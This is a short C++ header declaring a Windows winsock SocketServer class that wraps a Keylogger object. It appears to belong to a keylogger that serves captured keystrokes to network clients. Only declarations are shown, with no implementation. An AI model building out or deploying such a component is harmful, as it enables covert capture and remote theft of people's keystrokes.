#pragma once

#include <iostream>
#include <string>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <regex>
#include <winsock2.h>
#include <WS2tcpip.h>

#include "Keylogger.h"

#define SOCKET_BUFFER_SIZE 1024

class SocketServer {
private:
	Keylogger* logger;
	SOCKET listenSocket;

	std::string ip;
	std::string hostName;

	void initHostInfo();
	static std::vector<std::string> parseRequest(std::string request);
public:
	SocketServer(Keylogger* logger);
	void start();
	std::string getResponse(std::string request);
	std::string getHostName();
};

